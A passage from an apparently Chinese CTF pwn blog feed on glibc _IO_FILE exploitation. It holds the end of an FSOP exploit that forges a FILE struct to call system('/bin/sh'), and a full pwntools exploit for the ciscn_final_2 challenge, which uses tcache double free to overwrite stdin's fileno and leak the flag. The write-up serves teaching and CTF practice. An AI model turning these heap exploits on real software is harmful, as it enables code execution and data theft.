class="line"><span class="comment">#leak libc</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x90</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x90</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">88</span>-<span class="number">0x3c4b20</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># repair chunk_size&amp;prev_size</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0xf71</span>)+p64(libc_base+<span class="number">88</span>+<span class="number">0x3c4b20</span>)*<span class="number">2</span></span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*<span class="number">0xf50</span>+p64(<span class="number">0xf70</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Done&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># larginbin leak heap addr</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x450</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xa0</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x90</span></span><br><span class="line">log.info(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0x461</span>))</span><br><span class="line"></span><br><span class="line">IO_list_all=libc_base+libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;IO_list_all:&quot;</span>+<span class="built_in">hex</span>(IO_list_all))</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># FSOP</span></span><br><span class="line"><span class="comment"># set fake struct</span></span><br><span class="line"><span class="comment">#payload=&#x27;a&#x27;*0x450+p64(0)+p64(0x21)+p64(0x0000ddaa00000003)+p64(0)</span></span><br><span class="line">payload = <span class="string">&#x27;b&#x27;</span>*<span class="number">0x450</span></span><br><span class="line">fake = <span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>)</span><br><span class="line">fake += p64(<span class="number">0</span>)+p64(IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">fake += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">fake = fake.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">fake += p64(heap_base+<span class="number">0x5c8</span>) <span class="comment"># vtable</span></span><br><span class="line">fake += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake += p64(system)</span><br><span class="line">payload += fake</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = &#x27;b&#x27;*0x458+p64(0x60)</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *$rebase(0xc2e)&#x27;)</span></span><br><span class="line"></span><br><span class="line">command(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x80</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="劫持-fileno-控制文件流"><a href="#劫持-fileno-控制文件流" class="headerlink" title="劫持 fileno 控制文件流"></a>劫持 fileno 控制文件流</h2><p>先来了解一下 linux 的 file 文件结构，fileno 等概念。</p><h3 id="IO-FILE-结构-1"><a href="#IO-FILE-结构-1" class="headerlink" title="_IO_FILE 结构"></a>_IO_FILE 结构</h3><p>FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。在标准 I/O 库中，每个程序启动时有三个文件流是自动打开的：<strong>stdin、stdout、stderr，分别对应文件描述符：0、1、2</strong>。后续再打开文件对应的文件描述符就从 3 开始，当然可以用 dup2 修改。</p><p><strong>每个文件流都有自己的 FILE 结构体</strong>。结构体内容如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在 ida 中搜索 <code>_IO_2_1_stdxxx_</code> 或者 <code>stdxx</code> 可以找到默认打开的三个文件描述符 FILE 结构体存储地址：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210126231723.png" alt="image-20201210083553060"></p><p> gdb 调试中查看结构体内容：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210126231706.png" alt="image-20201210083345062"></p><p><strong>_fileno</strong> 是当前文件流的文件描述符，上图是 stderr 对应就是 2 。</p><p>我们知道 stdin 文件描述符是 0 ，如果我们将 stdin 的 fileno 修改为 2 ，那么 stdin 就变成了 stderr 。</p><h3 id="实战练习"><a href="#实战练习" class="headerlink" title="实战练习"></a>实战练习</h3><h4 id="基本情况-4"><a href="#基本情况-4" class="headerlink" title="基本情况"></a>基本情况</h4><p>原题环境是在 ubuntu18.04 旧版本 glibc ，也就是允许 tcache doublefree ，注意检查 glibc 版本。</p><pre><code>Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled</code></pre><p>在初始化函数中，打开 flag 的文件流，紧接着用 dup2 将原本文件描述符从 3 修改为 666 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">……</span><br><span class="line">  fd = open(<span class="string">&quot;flag&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;no such file :flag&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  dup2(fd, <span class="number">666</span>);                                <span class="comment">// 改变文件描述符</span></span><br><span class="line">  close(fd);</span><br><span class="line">……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>堆申请有两种大小：0x20、0x30 ，数量没有限制。结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">int</span>&#123;</span></span><br><span class="line">  <span class="keyword">int</span> num;</span><br><span class="line">  <span class="keyword">int</span> num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">short_int</span>&#123;</span></span><br><span class="line"> <span class="keyword">short</span> num;</span><br><span class="line">  <span class="keyword">short</span> num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>free 堆后没有将指针指令，造成 UAF 漏洞，还有一点就是 doublefree 需要处理 bool 这个全局变量：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">……</span><br><span class="line">  <span class="keyword">if</span> ( <span class="keyword">bool</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;TYPE:\n1: int\n2: short int\n&gt;&quot;</span>);</span><br><span class="line">    v1 = get_atoi();</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">1</span> &amp;&amp; int_pt )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(int_pt);</span><br><span class="line">      <span class="keyword">bool</span> = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;remove success !&quot;</span>);                 <span class="comment">// UAF</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">2</span> &amp;&amp; short_pt )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(short_pt);</span><br><span class="line">      <span class="keyword">bool</span> = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;remove success !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>show 函数限制使用 3 次，还需要注意输出长度问题，也就是用于泄露地址时并不是完整的地址：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">……</span><br><span class="line">  <span class="keyword">if</span> ( show_time-- )<span class="comment">//show_time=3</span></span><br><span class="line">……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exit 函数有一段输出功能：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">bye_bye</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ……</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%99s&quot;</span>, v0);</span><br><span class="line">  ……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h4><p>利用 exit 时 scanf 输出函数，就 stdin 的文件描述符修改为 666 ，那么输出就变成输出，将 flag 内容给输出出来。</p><p>double free tcache 泄露堆地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak heap address</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">heap_base = show(<span class="number">2</span>)-<span class="number">0x290</span></span><br><span class="line">log.info(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure><p>修改 chunk0 size ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># house of spirt</span></span><br><span class="line">add(<span class="number">2</span>, heap_base+<span class="number">0x250</span>)</span><br><span class="line">add(<span class="number">2</span>, heap_base+<span class="number">0x250</span>)</span><br><span class="line"><span class="comment"># overwrite chunk0 size to 0x91</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x91</span>)</span><br></pre></td></tr></table></figure><p>多次释放 chunk0 最后放入 unsortedbin 泄露 libc 地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak libc address</span></span><br><span class="line"><span class="comment"># double free chunk0 into unsortedbin </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">leak_addr = show(<span class="number">1</span>) - <span class="number">96</span></span><br><span class="line">libc_base = leak_addr - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span></span><br></pre></td></tr></table></figure><p>修改 stdin 的 fileno 为 666 ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># write tcache fd </span></span><br><span class="line">add(<span class="number">1</span>, stdin_fileno)</span><br><span class="line"></span><br><span class="line"><span class="comment"># house of sprit</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x30</span>) </span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">heap_base = show(<span class="number">1</span>) - <span class="number">0x290</span></span><br><span class="line">log.info(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">add(<span class="number">1</span>, heap_base+<span class="number">0x260</span>)</span><br><span class="line">add(<span class="number">1</span>, heap_base+<span class="number">0x260</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">231</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">666</span>)</span><br></pre></td></tr></table></figure><h4 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(binary=<span class="string">&quot;./ciscn_final_2&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./ciscn_final_2&quot;</span>, env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;libc-2.27.so&quot;</span>&#125;)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_final_2&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">type</span>, num</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(num))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">type</span></span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">type</span></span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">1</span>:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">type</span> == <span class="number">2</span>:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># leak heap address</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">heap_base = show(<span class="number">2</span>)-<span class="number">0x290</span></span><br><span class="line">log.info(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># house of spirt</span></span><br><span class="line">add(<span class="number">2</span>, heap_base+<span class="number">0x250</span>)</span><br><span class="line">add(<span class="number">2</span>, heap_base+<span class="number">0x250</span>)</span><br><span class="line"><span class="comment"># overwrite chunk0 size to 0x91</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x91</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc address</span></span><br><span class="line"><span class="comment"># double free chunk0 into unsortedbin </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">leak_addr = show(<span class="number">1</span>) - <span class="number">96</span></span><br><span class="line">libc_base = leak_addr - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">stdin_fileno = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>] + <span class="number">0x70</span></span><br><span class="line">log.info(<span class="string">&quot;stdin_fileno:&quot;</span>+<span class="built_in">hex</span>(stdin_fileno))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># write tcache fd </span></span><br><span class="line">add(<span class="number">1</span>, stdin_fileno)</span><br><span class="line"></span><br><span class="line"><span class="comment"># house of sprit</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x30</span>) </span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">heap_base = show(<span class="number">1</span>) - <span class="number">0x290</span></span><br><span class="line">log.info(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">add(<span class="number">1</span>, heap_base+<span class="number">0x260</span>)</span><br><span class="line">add(<span class="number">1</span>, heap_base+<span class="number">0x260</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">231</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">666</span>)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://blog.csdn.net/Mira_Hu/article/details/103736917">IO_FILE:2018 HCTF the_end</a></li><li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/4.13_io_file.html">4.13 利用 _IO_FILE 结构</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file">IO_FILE Related</a></li><li><a href="https://xz.aliyun.com/t/6567">IO file结构在pwn中的妙用</a></li><li><a href="https://bestwing.me/IO_FILE_Pwn.html">IO_FILE Pwn 利用整理</a></li></ul><hr><p>[^1]: 用 fwrite 等这种流 I/O 函数写入写出，数据会先放在缓冲区，并没有真正输入或者输出，需要用 fflush 冲洗流中信息才完成写入写出。避免用 fflush 冲洗就用 setbuf 函数关闭缓冲（pwn 题初始化必备）</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IO-FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>劫持 fileno 控制文件流</title>
      <link href="archives/bd0188a8/"/>
      <url>archives/bd0188a8/</url>
      
        <content type="html"><![CDATA[<p>先来了解一下 linux 的 file 文件结构，fileno 等概念。</p><h2 id="IO-FILE-结构"><a href="#IO-FILE-结构" class="headerlink" title="_IO_FILE 结构"></a>_IO_FILE 结构</h2><p>FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。在标准 I/O 库中，每个程序启动时有三个文件流是自动打开的：<strong>stdin、stdout、stderr，分别对应文件描述符：0、1、2</strong>。后续再打开文件对应的文件描述符就从 3 开始，当然可以用 dup2 修改。</p><p><strong>每个文件流都有自己的 FILE 结构体</strong>。结构体内容如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 